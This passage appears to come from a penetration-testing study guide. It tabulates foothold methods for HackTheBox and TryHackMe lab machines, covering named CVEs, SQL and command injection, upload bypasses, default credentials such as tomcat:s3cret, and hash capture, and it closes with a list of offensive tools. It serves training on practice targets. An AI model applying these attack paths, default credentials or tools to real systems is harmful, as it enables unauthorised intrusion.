| CCTV        | Lin | HTTP                | ZoneMinder CVE-2024-51482 boolean SQLi, crack the bcrypt hash, SSH.                                  | ZoneMinder app fingerprint.                           |
| Chatterbox  | Win | AChat (9255)        | AChat 0.150 buffer overflow for a shell as Alfred.                                                   | Service version from nmap.                            |
| Codify      | Lin | Node app (3000)     | vm2 3.9.16 sandbox escape (CVE-2023-30547) to RCE as svc.                                            | `/about` page names the vm2 library.                  |
| Connected   | Lin | HTTP                | Command injection in `ping_test.php` via the `ip` parameter.                                         | A ping utility that takes user input.                 |
| CozyHosting | Lin | Spring Boot         | Exposed `/actuator/sessions` leaks a session, then command injection in the SSH feature.             | Whitelabel error page, Spring Boot wordlist.          |
| Devvortex   | Lin | HTTP vhost          | Joomla 4.2.6 CVE-2023-23752 API info disclosure, admin login, template PHP shell.                    | `dev.devvortex.htb` vhost, Joomla version.            |
| Dog         | Lin | Backdrop CMS        | Exposed `.git` leaks DB creds and a user; Backdrop auth RCE via a malicious module.                  | `http-git` in nmap, Backdrop generator tag.           |
| Editor      | Lin | XWiki (8080)        | XWiki CVE-2025-24893 SolrSearch unauthenticated RCE.                                                 | `wiki.editor.htb` vhost, XWiki version.               |
| Editorial   | Lin | HTTP                | SSRF in the book upload preview, scan internal ports, hit a 5000 API that leaks creds, SSH.          | Upload field that fetches a URL.                      |
| Enigma      | Lin | NFS, IMAP           | Mount NFS to a PDF with creds, into IMAP, into an app, then a zip filename injection.                | `showmount` export, chained creds.                    |
| Giddy       | Win | HTTP, MSSQL         | SQLi then `xp_dirtree` to a rogue SMB server captures Stacy's NetNTLM, crack, PSWA login.            | `/Remote` ASP.NET app, injectable parameter.          |
| Heist       | Win | HTTP, WinRM         | Cisco config attachment holds type 7 and type 5 hashes; crack, then WinRM.                           | Login page links a Cisco IOS config file.             |
| Help        | Lin | HTTP (3000)         | GraphQL endpoint leaks creds, HelpDeskZ 1.0.2 arbitrary file upload (also blind SQLi), shell.        | `/support` HelpDeskZ, GraphQL on 3000.                |
| Irked       | Lin | UnrealIRCd (6697)   | UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) for a shell as ircd.                                     | IRCd version banner.                                  |
| Jarvis      | Lin | HTTP                | SQLi in `room.php`, then phpMyAdmin 4.8 LFI with log poisoning to RCE.                               | Injectable `cod` parameter.                           |
| Jeeves      | Win | Jenkins (50000)     | Jenkins at `/askjeeves` with no auth, Groovy script console to a shell.                              | Jetty on 50000, hidden Jenkins path.                  |
| Jerry       | Win | Tomcat (8080)       | Tomcat manager default `tomcat:s3cret`, deploy a malicious WAR.                                      | Tomcat manager login.                                 |
| Keeper      | Lin | HTTP                | Request Tracker default `root:password`, cleartext creds in the user profile, SSH.                   | `tickets.keeper.htb` running RT.                      |
| LinkVortex  | Lin | Ghost CMS           | Exposed `.git` on a dev vhost leaks admin creds, Ghost 5.58 CVE-2023-40028.                          | `dev.linkvortex.htb`, Ghost fingerprint.              |
| Love        | Win | HTTP (5000)         | SSRF in the file scanner leaks a password manager, Voting System authenticated RCE.                  | `staging` vhost, blocked port 5000.                   |
| Magic       | Lin | HTTP                | Login SQLi bypass, upload a PHP payload disguised as an image, shell.                                | Login form, image upload feature.                     |
| Mailing     | Win | hMailServer         | LFI in `download.php` leaks `hMailServer.ini` creds, then CVE-2024-21413 to capture maya's hash.     | Path traversal in download link.                      |
| Markup      | Win | HTTP                | XXE in the XML order form reads an SSH private key.                                                  | Order page parses XML input.                          |
| Mentor      | Lin | SNMP, API           | Brute the SNMP community string for a password, hit the API vhost, blind RCE.                        | UDP 161 SNMP, `api.mentorquotes.htb`.                 |
| Monitored   | Lin | Nagios XI, SNMP     | SNMP leaks svc creds in a command line, API token then CVE-2023-40931 SQLi for an admin key.         | UDP 161, Nagios XI on 443.                            |
| Netmon      | Win | FTP, PRTG           | Anonymous FTP reads an old PRTG config with cleartext creds, PRTG CVE-2018-9276 to SYSTEM.           | Anonymous FTP, PRTG on 80.                            |
| Networked   | Lin | HTTP                | File upload filter bypass (double extension and magic bytes) to a PHP webshell.                      | `/uploads` and `upload.php`.                          |
| Nibbles     | Lin | HTTP                | Nibbleblog 4.0.3 admin `admin:nibbles`, CVE-2015-6967 plugin image upload to a shell.                | `/nibbleblog/` directory.                             |
| Nineveh     | Lin | HTTP, HTTPS         | phpLiteAdmin 1.9 RCE to drop a PHP file, triggered through an LFI in the notes page.                 | `/db` phpLiteAdmin, `notes=` LFI.                     |
| OpenAdmin   | Lin | HTTP                | OpenNetAdmin 18.1.1 public RCE to www-data, creds in a DB config, SSH.                               | `/ona` OpenNetAdmin install.                          |
| Pandora     | Lin | SNMP, Pandora FMS   | SNMP leaks SSH creds, then Pandora FMS unauth SQLi and upload on an internal vhost.                  | UDP 161 SNMP enumeration.                             |
| Pilgrimage  | Lin | HTTP                | Exposed `.git` reveals ImageMagick 7.1.0-49, CVE-2022-44268 arbitrary file read.                     | `http-git`, git-dumper, magick binary.                |
| Poison      | Lin | HTTP                | LFI in `browse.php?file=`, read a base64 password backup, SSH.                                       | `file=` parameter in the URL.                         |
| Popcorn     | Lin | HTTP                | Torrent Hoster upload, bypass the screenshot check to upload a PHP shell.                            | `/torrent` upload feature.                            |
| Precious    | Lin | HTTP                | pdfkit 0.8.6 CVE-2022-25765 command injection via the URL parameter.                                 | Version in the generated PDF metadata.                |
| Querier     | Win | SMB, MSSQL          | A macro-laden `.xlsm` on an SMB share holds MSSQL creds, then xp\_cmdshell or a Responder capture.   | Readable SMB share with an Excel file.                |
| Remote      | Win | NFS, Umbraco        | Mount NFS, read the Umbraco .sdf for an admin hash, crack, Umbraco 7.12 authenticated RCE.           | `showmount` export, Umbraco site.                     |
| Secnotes    | Win | HTTP, SMB           | Second-order SQLi for admin creds, write a PHP shell to a writable SMB share mapped to the web root. | Registration flow, writable share.                    |
| Servmon     | Win | HTTP (NVMS)         | NVMS-1000 directory traversal reads a password list from a desktop, reuse over SSH.                  | NVMS-1000 login page, FTP notes.                      |
| Silentium   | Lin | HTTP vhost          | Flowise AI 3.0.5 password-reset logic flaw to take over an account and log in.                       | `staging.silentium.htb` vhost.                        |
| Sniper      | Win | HTTP                | LFI in `?lang=`, escalate to RFI by serving the payload over SMB.                                    | `lang=` parameter, SMB open.                          |
| Solidstate  | Lin | Apache James (4555) | James 2.3.2 admin `root:root`, reset a mailbox, read SSH creds from mail.                            | James admin on port 4555.                             |
| Sunday      | Lin | finger, SSH         | finger enumerates users, weak SSH password `sunny:sunday`.                                           | finger service responding.                            |
| Swagshop    | Lin | Magento             | Magento 1.x CVE-2015 exploit creates an admin, then RCE from the admin panel.                        | Magento version via git tags and xml.                 |
| Tabby       | Lin | Tomcat              | LFI in `news.php?file=` reads `tomcat-users.xml`, host-manager creds, deploy a WAR.                  | `file=` parameter, Tomcat on 8080.                    |
| Tartarsauce | Lin | WordPress           | wpscan finds the Gwolle Guestbook plugin, RFI to a shell as www-data.                                | WordPress at `/webservices/wp/`.                      |
| UnderPass   | Lin | SNMP, daloRADIUS    | SNMP reveals the daloRADIUS hint, default `administrator:radius`, cracked MD5 for SSH.               | UDP 161 banner naming daloRADIUS.                     |
| UpDown      | Lin | HTTP                | Exposed `.git` reveals a dev vhost gated by a custom header, file upload plus `phar://` RCE.         | `/dev/.git`, Special-Dev header in commits.           |

#### TryHackMe machines

| Machine               | OS  | Service           | Foothold vector                                                                                    | How it was spotted                           |
| --------------------- | --- | ----------------- | -------------------------------------------------------------------------------------------------- | -------------------------------------------- |
| Mr Robot              | Lin | HTTP              | WordPress login brute (fsocity.dic), edit the 404 theme template to a PHP reverse shell.           | wp-login and wp-admin from dir brute.        |
| Thompson              | Lin | Tomcat (8080)     | Tomcat manager default creds, deploy a malicious WAR.                                              | Tomcat manager page.                         |
| Kenobi                | Lin | ProFTPd, NFS      | ProFTPd 1.3.5 mod\_copy (CVE-2015-3306) copies the SSH key to a mountable NFS path, SSH as kenobi. | ProFTPd 1.3.5 version, SMB and NFS enum.     |
| GameZone              | Lin | HTTP              | SQL injection login bypass, then union SQLi dumps creds, SSH.                                      | Injectable login form.                       |
| Skynet                | Lin | SMB, HTTP         | Anonymous SMB leaks creds and logins, webmail, then a hidden Cuppa CMS directory with RFI.         | SMB shares, the hidden /45kra path.          |
| Daily Bugle           | Lin | Joomla            | Joomla 3.7.0 SQLi (CVE-2017-8917) dumps the admin hash, crack, admin template PHP edit.            | Joomla version, com\_fields injection.       |
| LazyAdmin             | Lin | HTTP              | SweetRice CMS, a MySQL backup leaks the admin hash, crack, then upload a PHP shell via ajax.       | /content SweetRice install and backup dir.   |
| Tomghost              | Lin | Tomcat AJP (8009) | Ghostcat (CVE-2020-1938) reads WEB-INF for SSH creds, SSH as skyfuck.                              | AJP on 8009, Tomcat.                         |
| RootMe                | Lin | HTTP              | Upload filter bypass (.phtml), PHP reverse shell to www-data.                                      | An upload form and /uploads.                 |
| CMesS                 | Lin | Gila CMS          | dev.cmess.thm vhost leaks andre's creds, Gila CMS 1.10.9 authenticated RCE (CVE-2020-13160).       | robots.txt, vhost fuzzing, Gila generator.   |
| Ultratech             | Lin | API (8081)        | Command injection in the Node API ping endpoint, read a sqlite user DB, crack bcrypt, SSH.         | Custom API on 8081.                          |
| Internal              | Lin | HTTP vhost        | WordPress on blog.internal.thm, brute admin, theme editor PHP shell.                               | blog vhost, WordPress.                       |
| Zeno                  | Lin | HTTP              | Restaurant Management System RCE via /admin/foods-exec.php.                                        | /rms app, admin exec endpoint.               |
| Boiler CTF            | Lin | FTP, HTTP         | Anonymous FTP plus web enum to a sar2html 3.2.1 RCE (plot parameter).                              | /joomla/\_test sar2html page.                |
| Wonderland            | Lin | HTTP              | A recursive directory path hides creds in page source, SSH as alice.                               | Deep directory recursion (/r/a/b/b/i/t).     |
| Year of the Jellyfish | Lin | HTTP              | Subdomain enum then Monitorr 1.7.6m unauthenticated RCE.                                           | A subdomain and the Monitorr version.        |
| Steel Mountain        | Win | HFS (8080)        | Rejetto HFS 2.3 CVE-2014-6287 unauthenticated RCE.                                                 | HttpFileServer 2.3 banner.                   |
| Year of the Owl       | Win | SNMP, WinRM       | Brute the SNMP community string, spray it over WinRM (Jareth:sarah).                               | UDP 161 SNMP, onesixtyone.                   |
| Retro                 | Win | HTTP, RDP         | A hidden WordPress post reveals a password, RDP as wade.                                           | WordPress, a post or comment with creds.     |
| Alfred                | Win | Jenkins (8080)    | Jenkins default admin:admin, Groovy script console reverse shell.                                  | Jenkins login.                               |
| Relevant              | Win | SMB, IIS          | Writable SMB share mapped to the web root on 49663, upload an ASPX webshell.                       | Writable share and a matching web directory. |
| Blueprint             | Win | HTTP (8080)       | oscommerce 2.3.4 public RCE to a shell.                                                            | oscommerce install path.                     |
| Hackpark              | Win | HTTP              | Brute the BlogEngine.NET login (cewl wordlist), CVE-2019-6714 upload RCE.                          | BlogEngine login and version.                |
| Weasel                | Win | SMB, Jupyter      | Anonymous SMB leaks a Jupyter token, open a terminal in Jupyter Notebook.                          | SMB misc share, jupyter-token.txt.           |
| AllSignsPoint2Pwnage  | Win | SMB, HTTP         | Writable SMB images share served by the web app, upload a webshell.                                | A hidden images share from enumeration.      |
| Anthem                | Win | HTTP, RDP         | Credentials hidden across the website, then RDP in.                                                | Website hints and robots.txt.                |

### Tooling quick reference

The tools behind the steps above, grouped by what you reach for them to do.

* **Port and service scanning:** `nmap` (full TCP, then `-sCV`, then `-sU` for SNMP), `rustscan` for speed.
* **Web content discovery:** `feroxbuster`, `gobuster`, `dirsearch`, `ffuf` (directories and virtual hosts). Keep SecLists handy.
* **Web fingerprinting and proxy:** `whatweb`, Wappalyzer, Burp Suite, the page footer and `/README`.
* **Exposed git:** `git-dumper`, `GitHack`, `nmap --script http-git`, then `git log` and `git show`.
* **SMB:** `smbclient`, `smbmap`, `enum4linux-ng`, `crackmapexec`.
* **SNMP:** `snmpwalk -v2c -c public`, `snmpbulkwalk`, `onesixtyone` and `snmp-check` for community strings.
* **Credentials and hashes:** `hydra` for brute force, `hashcat` and `john` for cracking, `rockyou.txt`.
* **Databases:** `impacket-mssqlclient`, `mysql`, `sqlmap` (and manual SQLi when sqlmap is blocked).
* **Hash capture:** `responder` and Impacket `smbserver.py` for NetNTLM via UNC or `xp_dirtree`.
* **Windows access:** `evil-winrm` (WinRM), `impacket` suite (`psexec`, `wmiexec`, `smbexec`).
* **Shells and listeners:** `nc`, `rlwrap nc`, `pwncat`, plus reverse-shell one-liners from revshells.com.
* **Finding exploits:** `searchsploit`, Exploit-DB, GitHub, and the vendor advisory for the exact version.

One habit ties it all together: pin the exact version of every service, then search that version. On these boxes the version is what names the vulnerability.
